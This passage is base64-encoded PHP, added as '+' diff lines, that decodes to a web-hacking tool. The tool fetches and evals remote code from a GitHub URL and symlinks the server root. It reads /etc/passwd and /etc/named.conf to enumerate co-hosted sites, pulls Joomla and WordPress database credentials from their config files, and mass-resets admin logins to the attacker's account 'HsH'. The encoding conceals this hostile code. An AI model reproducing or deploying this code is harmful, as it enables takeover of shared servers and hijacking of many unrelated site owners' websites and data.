+LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4
+IHJnYmEoMCwgMCwgMCwgMC4xNSk7IH0gaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBj
+b2xvcjogIzsgdGV4dC1zaGFkb3c6ICMgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICM7
+IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjOyBwYWRk
+aW5nOiAzcHg7IC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAtbW96LWJvcmRlci1yYWRpdXM6
+IDRweDsgYm9yZGVyLXJhZGl1czogNHB4OyAtd2Via2l0LWJveC1zaGFkb3c6IHJnYig4NSw4NSw4
+NSkgMHB4IDBweCA0cHg7IC1tb3otYm94LXNoYWRvdzogIyAwcHggMHB4IDRweDt9XG4iOyAKZWNo
+byAiPC9zdHlsZT5cbiI7IAplY2hvICI8L2hlYWQ+PGJyPlxuIjsKZWNobyAiPGNlbnRlcj4tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLVsgU3ViZG9tYWluIElQIENoZWtlciBdLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0gPC9jZW50ZXI+XG4iOwplY2hvICI8Y2VudGVyPjwvY2VudGVyPjxkaXYg
+aWQ9cmVzdWx0PiI7CmVjaG8gIjxjZW50ZXI+PGJyPjxmb3JtPjxpbnB1dCB0eXBlPSd0ZXh0JyBz
+aXplPSc2MCcgdmFsdWU9J0hzSC5nby5pZCcgbmFtZT0ncGVudGlsJyAvPiZuYnNwOzxpbnB1dCB0
+eXBlPSdzdWJtaXQnIHZhbHVlPSdzZWFyY2gnPjwvZm9ybT48L2NlbnRlcj4iOwppZihpc3NldCgk
+X0dFVFsicGVudGlsIl0pKQp7CiR4ZjQgPSAkX0dFVFsicGVudGlsIl07CiR4ZjUgPSAiaHR0cDov
+L2RvbWFpbnMueW91Z2V0c2lnbmFsLmNvbS9kb21haW5zLnBocCI7CgovL0N1cmwgRnVuY3Rpb24K
+JHhmNiA9IGN1cmxfaW5pdCgkeGY1KTsKY3VybF9zZXRvcHQoJHhmNiwgQ1VSTE9QVF9SRVRVUk5U
+UkFOU0ZFUiwgMSApOwpjdXJsX3NldG9wdCgkeGY2LCBDVVJMT1BUX1BPU1RGSUVMRFMsICJyZW1v
+dGVBZGRyZXNzPSR4ZjQma2V0PSIpOwpjdXJsX3NldG9wdCgkeGY2LCBDVVJMT1BUX0hFQURFUiwg
+MCk7CmN1cmxfc2V0b3B0KCR4ZjYsIENVUkxPUFRfUE9TVCwgMSk7CiR4ZjcgPSBjdXJsX2V4ZWMo
+JHhmNik7CiR4ZjcgPSBzdHJfcmVwbGFjZSgiWyIsIiIsIHN0cl9yZXBsYWNlKCJdIiwiIiwgc3Ry
+X3JlcGxhY2UoIlwiXCIiLCIiLCBzdHJfcmVwbGFjZSgiLCAsIiwiLCIsIHN0cl9yZXBsYWNlKCJ7
+IiwiIiwgc3RyX3JlcGxhY2UoInsiLCIiLCBzdHJfcmVwbGFjZSgifSIsIiIsIHN0cl9yZXBsYWNl
+KCIsICIsIiwiLCBzdHJfcmVwbGFjZSgiLCAiLCIsIiwgc3RyX3JlcGxhY2UoIiciLCIiLCBzdHJf
+cmVwbGFjZSgiJyIsIiIsIHN0cl9yZXBsYWNlKCI6IiwiLCIsIHN0cl9yZXBsYWNlKCciJywnJywg
+JHhmNyApICkgKSApICkgKSApICkgKSApKSkpOwokeDBlID0gZXhwbG9kZSgiLCwiLCAkeGY3KTsK
+dW5zZXQoJHgwZVswXSk7CmVjaG8gIjx0YWJsZSBzdHlsZT0nbWFyZ2luOiAwIGF1dG8nPiI7CmZv
+cmVhY2goJHgwZSBhcyAkeGY4KQp7CnByaW50ICI8dHI+PHRkPjxhIHN0eWxlPVwiY29sb3I6IzAw
+NzZCMTtcIiBocmVmPSckeGY4JyB0YXJnZXQ9X2JsYW5rPiR4Zjg8L2E+PC90ZD48L3RyPiI7Cn0K
+ZWNobyAiPC90YWJsZT4iOwpjdXJsX2Nsb3NlKCR4ZjYpOwp9Ci8vUEVSVEFNQU5FIElLSSBDT0sv
+LwoKaWYgKCBpc3NldCgkX0dFVFsnVWRNcyddKSApCnsKCiR4MGYgPSAiaHR0cHM6Ly9yYXcuZ2l0
+aHVidXNlcmNvbnRlbnQuY29tL2FudG9uaW9sYS9yZWpla2kvbWFzdGVyL3VkbS5waHAiOwokeDEw
+ID0gZmlsZV9nZXRfY29udGVudHMoJHgwZik7CmV2YWwoJz8+Jy4keDEwKTsKCgp9Ci8vU3ltbGlu
+a3UgaWtpIGNvayAvLwpzZXRfdGltZV9saW1pdCgwKTsKZXJyb3JfcmVwb3J0aW5nKDApOwoKCiR4
+ZjkgPSAnaHR0cDovLycuJF9TRVJWRVJbIlNFUlZFUl9OQU1FIl0uJF9TRVJWRVJbIlJFUVVFU1Rf
+VVJJIl07CiR4ZmEgPSBleHBsb2RlKCIvIiwkeGY5ICk7CiR4ZjkgPXN0cl9yZXBsYWNlKCR4ZmFb
+Y291bnQoJHhmYSktMV0sIiIsJHhmOSApOwoKJHhmYiA9ICdmdHA6Ly8nLiRfU0VSVkVSWyJTRVJW
+RVJfTkFNRSJdLicvcHVibGljX2h0bWwvJy4kX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsKJHhmYSA9
+IGV4cGxvZGUoIi8iLCR4ZmIgKTsKJHhmYiA9c3RyX3JlcGxhY2UoJHhmYVtjb3VudCgkeGZhKS0x
+XSwiIiwkeGZiICk7CgpAbWtkaXIoJ3N5bScsMDc3Nyk7CiR4ZmMgPSAiT3B0aW9ucyBhbGwgXG4g
+RGlyZWN0b3J5SW5kZXggU3V4Lmh0bWwgXG4gQWRkVHlwZSB0ZXh0L3BsYWluIC5waHAgXG4gQWRk
+SGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgXG4gQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sIFxu
+IEFkZEhhbmRsZXIgdHh0IC5odG1sIFxuIFJlcXVpcmUgTm9uZSBcbiBTYXRpc2Z5IEFueSI7CiR4
+ZmQgPUBmb3BlbiAoJ3N5bS8uaHRhY2Nlc3MnLCd3Jyk7CmZ3cml0ZSgkeGZkICwgJHhmYyk7CgoK
+CkBzeW1saW5rKCIvIiwic3ltL3Jvb3QiKTsKCiR4ZmUgPSBiYXNlbmFtZShfX0ZJTEVfXyk7Cgpp
+Zihpc3NldCgkX1JFUVVFU1RbJ3N3cyddKSkKewoKc3dpdGNoICgkX1JFUVVFU1RbJ3N3cyddKQp7
+CgoKLy8vIHVzZXIgKyBkb21pbmUgKyBzeW1saW5rIC8vLwoKY2FzZSAnc3ltJzoKCmlmKCFpc19m
+aWxlKCduYW1lZC50eHQnKSl7CgokeGZmID0gQGZpbGUoIi9ldGMvbmFtZWQuY29uZiIpOwoKfWVs
+c2V7CgokeGZmID0gQGZpbGUoIm5hbWVkLnR4dCIpOwoKCn0KaWYoISR4ZmYpCnsKCmRpZSAoIjxt
+ZXRhIGh0dHAtZXF1aXY9J3JlZnJlc2gnIGNvbnRlbnQ9JzA7IHVybD0/c3dzPXJlYWQnLz4iKTsK
+fQplbHNlCgp7CmVjaG8gIjxkaXYgY2xhc3M9J3RtcCc+PHRhYmxlIGFsaWduPSdjZW50ZXInIHdp
+ZHRoPSc0MCUnPjx0ZD5Eb21haW5zPC90ZD48dGQ+VXNlcnM8L3RkPjx0ZD5zeW1saW5rIDwvdGQ+
+IjsKZm9yZWFjaCgkeGZmIGFzICR4MTAwKXsKCmlmKGVyZWdpKCJ6b25lIiwkeDEwMCkpewoKcHJl
+Z19tYXRjaF9hbGwoJyN6b25lICIoLiopIiMnLCAkeDEwMCwgJHgxMDEpOwoKZmx1c2goKTsKCmlm
+KHN0cmxlbih0cmltKCR4MTAxWzFdWzBdKSkgPiAyKXsKCiR4MTAyID0gcG9zaXhfZ2V0cHd1aWQo
+QGZpbGVvd25lcigiL2V0Yy92YWxpYXNlcy8iLiR4MTAxWzFdWzBdKSk7CgpmbHVzaCgpOwoKCgok
+eGY0ID0gJHgxMDJbJ25hbWUnXSA7CgoKQHN5bWxpbmsoIi8iLCJzeW0vcm9vdCIpOwoKJHhmNCA9
+ICR4MTAxWzFdWzBdOwoKJHgxMDMgPSAnaXInOwoKJHgxMDQgPSAnaWwnOwoKaWYgKHByZWdfbWF0
+Y2goIi8uXiR4MTAzLyIsJHgxMDFbMV1bMF0pIG9yIHByZWdfbWF0Y2goIi8uXiR4MTA0LyIsJHgx
+MDFbMV1bMF0pICkKewokeGY0ID0gIjxkaXYgc3R5bGU9JyBjb2xvcjogI0ZGMDAwMCA7IHRleHQt
+c2hhZG93OiAwcHggMHB4IDFweCByZWQ7ICc+Ii4keDEwMVsxXVswXS4iPC9kaXY+IjsKfQoKCmVj
+aG8gIgo8dHI+Cgo8dGQ+CjxkaXYgY2xhc3M9J2RvbSc+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9
+aHR0cDovL3d3dy4iLiR4MTAxWzFdWzBdLiIvPiIuJHhmNC4iIDwvYT4gPC9kaXY+CjwvdGQ+CgoK
+PHRkPgoiLiR4MTAyWyduYW1lJ10uIgo8L3RkPgoKCgoKCgo8dGQ+CjxhIGhyZWY9J3N5bS9yb290
+L2hvbWUvIi4keDEwMlsnbmFtZSddLiIvcHVibGljX2h0bWwnIHRhcmdldD0nX2JsYW5rJz5zeW1s
+aW5rIDwvYT4KPC90ZD4KCgo8L3RyPjwvZGl2PiAiOwoKCmZsdXNoKCk7CmZsdXNoKCk7Cgp9Cn0K
+fQp9CgoKCgpicmVhazsKCgovLy8gYnlwYXNzIHJlYWQKCmNhc2UgJ3JlYWQnOgoKZWNobyAicmVh
+ZCAvZXRjL25hbWVkLmNvbmYiOwplY2hvICI8YnIgLz48YnIgLz48Zm9ybSBtZXRob2Q9J3Bvc3Qn
+IGFjdGlvbj0nP3N3cz1yZWFkJnNhdmU9MSc+PHRleHRhcmVhIGNvbHM9JzgwJyByb3dzPScyMCcg
+bmFtZT0nZmlsZSc+IjsKZmx1c2goKTsKZmx1c2goKTsKCgokeDI5ID0gJy9ldGMvbmFtZWQuY29u
+Zic7CgoKJHgxMDUgPSBAZm9wZW4oJHgyOSwgJ3InKTsKaWYgKCR4MTA1KXsKJHgxMDYgPSBAZnJl
+YWQoJHgxMDUsIEBmaWxlc2l6ZSgkeDI5KSk7CmVjaG8gIiIuaHRtbGVudGl0aWVzKCR4MTA2KS4i
+IjsKfQplbHNlIGlmICghJHgxMDUpCnsKJHgxMDUgPSBAc2hvd19zb3VyY2UoJHgyOSkgOwp9CmVs
+c2UgaWYgKCEkeDEwNSkKewokeDEwNSA9IEBoaWdobGlnaHRfZmlsZSgkeDI5KTsKfQplbHNlIGlm
+ICghJHgxMDUpCnsKJHgxMDcgPSBAc3ltbGluaygkeDI5LCdzeW0udHh0Jyk7CgoKaWYgKCR4MTA3
+KXsKJHgxMDUgPSBAZm9wZW4oJ3N5bS9zeW0udHh0JywgJ3InKTsKJHgxMDYgPSBAZnJlYWQoJHgx
+MDUsIEBmaWxlc2l6ZSgkeDI5KSk7CmVjaG8gIiIuaHRtbGVudGl0aWVzKCR4MTA2KS4iIjsKCn0K
+fQoKCgplY2hvICI8L3RleHRhcmVhPjxiciAvPjxiciAvPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZh
+bHVlPSdzYXZlJy8+IDwvZm9ybT4iOwoKCmlmKGlzc2V0KCRfR0VUWydzYXZlJ10pKXsKCgokeDEw
+OCA9IHN0cmlwY3NsYXNoZXMoJF9QT1NUWydmaWxlJ10pOwoKJHhmZCA9IGZvcGVuKCduYW1lZC50
+eHQnLCd3Jyk7CgokeDEwOSA9IGZ3cml0ZSgkeGZkLCR4MTA4KTsKCmlmKCR4MTA5KXsKCmVjaG8g
+JzxiciAvPldlcyBEaSBTZW1wZW4gJzsKCn0KCmZjbG9zZSgkeGZkKTsKCgoKCn0KCgoKYnJlYWs7
+CgovLyBwYXNzd2QKCmNhc2UgJ3Bhc3N3ZCc6CgppZihpc3NldCgkX0dFVFsnc2F2ZSddKSBhbmQg
+aXNzZXQoJF9QT1NUWydmaWxlJ10pIG9yIEBmaWxlc2l6ZSgncGFzc3dkLnR4dCcpID4gMCl7CgoK
+JHgxMDggPSBzdHJpcGNzbGFzaGVzKCRfUE9TVFsnZmlsZSddKTsKCmlmKCFmaWxlX2V4aXN0cygn
+cGFzc3dkLnR4dCcpKXsKCiR4ZmQgPSBAZm9wZW4oJ3Bhc3N3ZC50eHQnLCd3Jyk7CgokeDEwOSA9
+IEBmd3JpdGUoJHhmZCwkeDEwOCk7CgpmY2xvc2UoJHhmZCk7Cn0KaWYoJHgxMDkgb3IgQGZpbGVz
+aXplKCdwYXNzd2QudHh0JykgPiAwKXsKLy8gKiBTSE9XICogLy8KCmVjaG8gIjxkaXYgY2xhc3M9
+J3RtcCc+PHRhYmxlIGFsaWduPSdjZW50ZXInIHdpZHRoPScxMDAlJz48dGQ+VXNlcnM8L3RkPjx0
+ZD5zeW1saW5rPC90ZD48dGQ+RlRQPC90ZD4iOwpmbHVzaCgpOwoKJHgxMGEgPSBmaWxlKCdwYXNz
+d2QudHh0Jyk7Cgpmb3JlYWNoICgkeDEwYSBhcyAkeGZkKXsKCiR4ZmE9ZXhwbG9kZSgnOicsICR4
+ZmQpOwokeDEwMiA9ICR4ZmFbJzAnXTsKCgoKZWNobyAiCjx0cj4KCgoKPHRkIHdpZHRoPScxNSUn
+PgokeDEwMgo8L3RkPgoKCgoKCgo8dGQgd2lkdGg9JzEwJSc+CjxhIGhyZWY9J3N5bS9yb290L2hv
+bWUvJHgxMDIvcHVibGljX2h0bWwnIHRhcmdldD0nX2JsYW5rJz5TeW1saW5rIDwvYT4KPC90ZD4K
+Cjx0ZCB3aWR0aD0nMTAlJz4KPGEgaHJlZj0nJHhmYi9zeW0vcm9vdC9ob21lLyR4MTAyL3B1Ymxp
+Y19odG1sJyB0YXJnZXQ9J19ibGFuayc+RlRQPC9hPgo8L3RkPgoKCgo8L3RyPjwvZGl2PiAiOwoK
+CmZsdXNoKCk7CmZsdXNoKCk7CgoKfQoKCgoKCgpkaWUgKCI8L3RyPjwvZGl2PiIpOwoKCn0KCgoK
+Cgp9CgoKCmVjaG8gInJlYWQgL2V0Yy9wYXNzd2QiOwplY2hvICI8YnIgLz48YnIgLz48Zm9ybSBt
+ZXRob2Q9J3Bvc3QnIGFjdGlvbj0nP3N3cz1wYXNzd2Qmc2F2ZT0xJz48dGV4dGFyZWEgY29scz0n
+ODAnIHJvd3M9JzIwJyBuYW1lPSdmaWxlJz4iOwpmbHVzaCgpOwoKJHgyOSA9ICcvZXRjL3Bhc3N3
+ZCc7CgoKJHgxMDUgPSBAZm9wZW4oJHgyOSwgJ3InKTsKaWYgKCR4MTA1KXsKJHgxMDYgPSBAZnJl
+YWQoJHgxMDUsIEBmaWxlc2l6ZSgkeDI5KSk7CmVjaG8gIiIuaHRtbGVudGl0aWVzKCR4MTA2KS4i
+IjsKfQplbHNlaWYoISR4MTA1KQp7CiR4MTA1ID0gQHNob3dfc291cmNlKCR4MjkpIDsKfQplbHNl
+aWYoISR4MTA1KQp7CiR4MTA1ID0gQGhpZ2hsaWdodF9maWxlKCR4MjkpOwp9CmVsc2VpZighJHgx
+MDUpCnsKCmZvcigkeDEwYj0wOyR4MTBiPDEwMDA7JHgxMGIrKyl7CiR4MTBjID0gcG9zaXhfZ2V0
+cHd1aWQoJHgxMGIpOwppZiAoIWVtcHR5KCR4MTBjKSkgewp3aGlsZSAobGlzdCAoJHgxMywgJHg4
+ZikgPSBlYWNoKCR4MTBjKSl7CnByaW50ICIkeDhmOiI7Cn0KcHJpbnQgIlxuIjsKfQoKfQoKfQoK
+CmZsdXNoKCk7CgoKZWNobyAiPC90ZXh0YXJlYT48YnIgLz48YnIgLz48aW5wdXQgdHlwZT0nc3Vi
+bWl0JyB2YWx1ZT0nJm5ic3A7Jm5ic3A7c3ltbGluayZuYnNwOyZuYnNwOycvPiA8L2Zvcm0+IjsK
+Zmx1c2goKTsKCmJyZWFrOwoKCgpjYXNlICdqb29tbGEnOgoKLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLyB4eHh4eHh4eHh4
+eHh4eHh4eHh4IC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCgppZihpc3NldCgkX1BPU1Rb
+J3MnXSkpewoKJHgyOSA9IEBmaWxlX2dldF9jb250ZW50cygnSm9tYmxvLnR4dCcpOwoKJHgxMGQg
+PSBleHBsb2RlKCJcbiIsJHgyOSk7CgplY2hvICI8ZGl2IGNsYXNzPSd0bXAnPjx0YWJsZSBhbGln
+bj0nY2VudGVyJyB3aWR0aD0nNDAlJz48dGQ+IGRvbWluIDwvdGQ+PHRkPiBjb25maWcgPC90ZD48
+dGQ+IFJlc3VsdCA8L3RkPiI7CmZsdXNoKCk7CgoKZm9yZWFjaCAoJHgxMGQgYXMgJHgxMGUpewoK
+JHgxMGYgPSBleHBsb2RlKCJ8fCIsJHgxMGUpOwoKJHgxMTAgPSAkeDEwZlswXTsKCiR4MTExID0g
+JHgxMGZbMV07CgokeDExMiA9IHRyaW0oJHgxMTEpLicnOwoKJHgxMTMgPSBAZmlsZV9nZXRfY29u
+dGVudHModHJpbSgkeDExMCkpOwoKaWYoZXJlZygnSkNvbmZpZycsJHgxMTMpKXsKCgoKJHgxMTQg
+PSBleCgkeDExMywnJHgzYiA9IFwnJywiJzsiKTsKCiR4MTE1ID0gZXgoJHgxMTMsJyR4MTAyID0g
+XCcnLCInOyIpOwoKJHgxMTYgPSBleCgkeDExMywnJHgxMTYgPSBcJycsIic7Iik7CgokeDExNyA9
+IGV4KCR4MTEzLCckeDExOCA9IFwnJywiJzsiKTsKCiR4MTE5ID0gJHgxMTcuJ3VzZXJzJzsKCgok
+eDExYSA9IEBteXNxbF9jb25uZWN0KCdsb2NhbGhvc3QnLCR4MTE1LCR4MTE0KTsKCiR4MTE2ID0g
+QG15c3FsX3NlbGVjdF9kYigkeDExNiwkeDExYSk7CgokeDExYiA9IEBteXNxbF9xdWVyeSgiVVBE
+QVRFIGAkeDExOWAgU0VUIGB1c2VybmFtZWAgPSdIc0gnIik7CgoKJHgxMWMgPSBAbXlzcWxfcXVl
+cnkoIlVQREFURSBgJHgxMTlgIFNFVCBgcGFzc3dvcmRgID0nNDRhMGJjZGE2MTE1MTQ2MjViYTk0
+ZTBiMWMwYmRhZWQ6MmlldHM5eWRqUjNpT2RTdXl2VzU0cEl6eUY5TTFQNUonIik7CgoKaWYgKCR4
+MTFiIGFuZCAkeDExYyApeyR4MTFkID0gJzxiIHN0eWxlPSJjb2xvcjogIzAwNjYwMCI+U3VjY2Vl
+ZCA8L2I+dXNlciBbIEhzSCBdIHBhc3MgWzFdPC9iPic7fWVsc2V7JHgxMWQgPSAnPGIgc3R5bGU9
+ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPic7fQoKJHgxMTIgPSB0cmltKCR4MTExKS4nJzsKCmVjaG8g
+Ijx0cj4KPHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdodHRwOi8vJHgxMTInPiR4MTExPC9h
+PjwvdGQ+Cjx0ZD48YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nJHgxMTAnPmNvbmZpZzwvYT48L3Rk
+Pjx0ZD4iLiR4MTFkLiI8L3RkPjwvdHI+IjsKZmx1c2goKTsKCgoKfWVsc2V7CgplY2hvICI8dHI+
+Cjx0ZD48YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0naHR0cDovLyR4MTEyJz4keDExMTwvYT48L3Rk
+Pgo8dGQ+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2h0dHA6Ly8keDEwZSc+Y29uZmlnPC9hPjwv
+dGQ+PHRkPjxiIHN0eWxlPSdjb2xvcjpyZWQnPmZhaWxlZDwvYj48L3RkPjwvdHI+IjsKZmx1c2go
+KTsKCn0KCn0KCgoKCgoKCgoKZGllKCk7Cgp9CgppZighaXNfZmlsZSgnbmFtZWQudHh0JykpewoK
+JHhmZiA9IEBmaWxlKCIvZXRjL25hbWVkLmNvbmYiKTsKCmZsdXNoKCk7CgoKfWVsc2V7CgokeGZm
+ID0gZmlsZSgibmFtZWQudHh0Iik7CgoKfQppZighJHhmZikKewoKZGllICgiPG1ldGEgaHR0cC1l
+cXVpdj0ncmVmcmVzaCcgY29udGVudD0nMDsgdXJsPT9zd3M9cmVhZCcvPiIpOwp9CmVsc2UKCnsK
+ZWNobyAiPGRpdiBjbGFzcz0ndG1wJz4KPGZvcm0gbWV0aG9kPSdQT1NUJyBhY3Rpb249JyR4ZmU/
+c3dzPWpvb21sYSc+CjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdNYXNzIGNoaW5nIEFkbWlu
+JyAvPgo8aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nMScgbmFtZT0ncycgLz4KPC9mb3JtPjxi
+ciAvPjxiciAvPgo8dGFibGUgYWxpZ249J2NlbnRlcicgd2lkdGg9JzQwJSc+PHRkPiBEb21haW5z
+IDwvdGQ+PHRkPiBjb25maWcgPC90ZD48dGQ+IFJlc3VsdCA8L3RkPiI7CgokeGZkID0gZm9wZW4o
+J2pvb21sYS50eHQnLCd3Jyk7Cgpmb3JlYWNoKCR4ZmYgYXMgJHgxMDApewoKaWYoZXJlZ2koInpv
+bmUiLCR4MTAwKSl7CgpwcmVnX21hdGNoX2FsbCgnI3pvbmUgIiguKikiIycsICR4MTAwLCAkeDEw
+MSk7CgppZihzdHJsZW4odHJpbSgkeDEwMVsxXVswXSkpID4gMil7CgokeDEwMiA9IHBvc2l4X2dl
+dHB3dWlkKEBmaWxlb3duZXIoIi9ldGMvdmFsaWFzZXMvIi4keDEwMVsxXVswXSkpOwoKLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8KCiR4MTFlPSR4ZjkuIi9zeW0vcm9vdC9ob21lLyIuJHgxMDJb
+J25hbWUnXS4iL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwIjsKJHgxMWY9Z2V0X2hlYWRl
+cnMoJHgxMWUpOwokeDEyMD0keDExZlswXTsKCiR4MTIxPSR4ZjkuIi9zeW0vcm9vdC9ob21lLyIu
+JHgxMDJbJ25hbWUnXS4iL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAiOwokeDEy
+Mj1nZXRfaGVhZGVycygkeDEyMSk7CiR4MTIzPSR4MTIyWzBdOwoKJHgxMjQ9JHhmOS4iL3N5bS9y
+b290L2hvbWUvIi4keDEwMlsnbmFtZSddLiIvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRp
+b24ucGhwIjsKJHgxMjU9Z2V0X2hlYWRlcnMoJHgxMjQpOwokeDEyNj0keDEyNVswXTsKCgovLy8v
+Ly8vLy8vIGpvb21sYSAvLy8vLy8vLy8vLy8KCiR4NDYgPSBzdHJwb3MoJHgxMjAsICIyMDAiKTsK
+JHgxMTA9IiZuYnNwOyI7CgppZiAoc3RycG9zKCR4MTIwLCAiMjAwIikgPT0gdHJ1ZSApCnsKJHgx
+MTA9ICR4MTFlOwp9CmVsc2VpZiAoc3RycG9zKCR4MTIzLCAiMjAwIikgPT0gdHJ1ZSkKewokeDEx
+MD0gJHgxMjE7Cn0KZWxzZWlmIChzdHJwb3MoJHgxMjYsICIyMDAiKSA9PSB0cnVlKQp7CiR4MTEw
+PSAkeDEyNDsKfQplbHNlCnsKY29udGludWU7Cgp9CmZsdXNoKCk7CgovLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8v
+Ly8vLy8vLy8vLy8vCgokeDEwMCA9ICR4MTAxWzFdWzBdOwoKJHgxMDkgPSBmd3JpdGUoJHhmZCwi
+JHgxMTB8fCR4MTAwIFxuIik7CmlmKCR4MTA5KXskeDExZCA9ICc8YiBzdHlsZT0iY29sb3I6ICMw
+MDY2MDAiPlNhdmU8L2I+Jzt9ZWxzZXskeDExZCA9ICc8YiBzdHlsZT0iY29sb3I6cmVkIj5mYWls
+ZWQ8L2I+Jzt9CgoKZWNobyAiPHRyPjx0ZD48YSBocmVmPWh0dHA6Ly93d3cuIi4keDEwMVsxXVsw
+XS4iPiIuJHgxMDFbMV1bMF0uIjwvYT48L3RkPgo8dGQ+PGEgaHJlZj0nJHgxMTAnPmNvbmZpZzwv
+YT48L3RkPjx0ZD4iLiR4MTFkLiI8L3RkPjwvdHI+IjsKCgoKCgpmbHVzaCgpOwoKCn0KfQp9Cn0K
+CgpicmVhazsKCmNhc2UgJ3dwJzoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgaW5kZXgg
+IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIzMKCgoKCgoKIyMjIyMjIyMgYWRtaW4gIyMjIyMjIyMj
+IzMzCgppZihpc3NldCgkX1BPU1RbJ3MnXSkpewoKJHgyOSA9IEBmaWxlX2dldF9jb250ZW50cygn
+V2FuaVBpcm8udHh0Jyk7CgokeDEwZCA9IGV4cGxvZGUoIlxuIiwkeDI5KTsKCmVjaG8gIjxkaXYg
+Y2xhc3M9J3RtcCc+PHRhYmxlIGFsaWduPSdjZW50ZXInIHdpZHRoPSc0MCUnPjx0ZD4gZG9taW4g
+PC90ZD48dGQ+IGNvbmZpZyA8L3RkPjx0ZD4gUmVzdWx0IDwvdGQ+IjsKZmx1c2goKTsKZmx1c2go
+KTsKCgpmb3JlYWNoICgkeDEwZCBhcyAkeDEwZSl7CgokeDEwZiA9IGV4cGxvZGUoInx8IiwkeDEw
+ZSk7CgokeDExMCA9ICR4MTBmWzBdOwoKJHgxMTEgPSAkeDEwZlsxXTsKCiR4MTEyID0gdHJpbSgk
+eDExMSkuJyc7CgokeDExMyA9IEBmaWxlX2dldF9jb250ZW50cyh0cmltKCR4MTEwKSk7CgppZihl
+cmVnKCd3cC1zZXR0aW5ncy5waHAnLCR4MTEzKSl7CgoKCiR4MTE0ID0gZXgoJHgxMTMsImRlZmlu
+ZSgnREJfUEFTU1dPUkQnLCAnIiwiJyk7Iik7CgokeDExNSA9IGV4KCR4MTEzLCJkZWZpbmUoJ0RC
+X1VTRVInLCAnIiwiJyk7Iik7CgokeDExNiA9IGV4KCR4MTEzLCJkZWZpbmUoJ0RCX05BTUUnLCAn
+IiwiJyk7Iik7CgokeDExNyA9IGV4KCR4MTEzLCckeDEyNyA9IFwnJywiJzsiKTsKCiR4MTE5ID0g
+JHgxMTcuJ3VzZXJzJzsKCiR4MTFhID0gQG15c3FsX2Nvbm5lY3QoJ2xvY2FsaG9zdCcsJHgxMTUs
+JHgxMTQpOwoKJHgxMTYgPSBAbXlzcWxfc2VsZWN0X2RiKCR4MTE2LCR4MTFhKTsKCiR4MTFiID0g
+QG15c3FsX3F1ZXJ5KCJVUERBVEUgYCR4MTE5YCBTRVQgYHVzZXJfbG9naW5gID0nSHNIJyIpIG9y
+IGRpZTsKCiR4MTFiID0gQG15c3FsX3F1ZXJ5KCJVUERBVEUgYCR4MTE5YCBTRVQgYHVzZXJfcGFz
+c2AgPSckMSQ0ei8uNWkuLiQ5YUhZQi5mVUhFbU5aLmVJS1lUd3gvJyIpIG9yIGRpZTsKCgoKaWYg
+KCR4MTFiKXskeDExZCA9ICc8YiBzdHlsZT0iY29sb3I6ICMwMDY2MDAiPlN1Y2NlZWQgPC9iPnVz
+ZXIgWyBIc0ggXSBwYXNzIFsxXTwvYj4nO30KCmVsc2UKCnsKCiR4MTFkID0gJzxiIHN0eWxlPSJj
+b2xvcjpyZWQiPmZhaWxlZDwvYj4nOwoKfQoKJHgxMTIgPSB0cmltKCR4MTExKS4nJzsKCmVjaG8g
+Ijx0cj4KPHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdodHRwOi8vJHgxMTInPiR4MTExPC9h
+PjwvdGQ+Cjx0ZD48YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nJHgxMTAnPmNvbmZpZzwvYT48L3Rk
+Pjx0ZD4iLiR4MTFkLiI8L3RkPjwvdHI+IjsKCmZsdXNoKCk7CmZsdXNoKCk7CgoKCgoKCn1lbHNl
+ewoKZWNobyAiPHRyPgo8dGQ+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2h0dHA6Ly8keDExMic+
+JHgxMTE8L2E+PC90ZD4KPHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdodHRwOi8vJHgxMTAn
+PmNvbmZpZzwvYT48L3RkPjx0ZD48YiBzdHlsZT0nY29sb3I6cmVkJz5mYWlsZWQyPC9iPjwvdGQ+
+PC90cj4iOwoKZmx1c2goKTsKZmx1c2goKTsKCn0KCn0KCgoKCgoKCgoKCmRpZSgpOwoKfQoKaWYo
+IWlzX2ZpbGUoJ25hbWVkLnR4dCcpKXsKCiR4ZmYgPSBAZmlsZSgiL2V0Yy9uYW1lZC5jb25mIik7
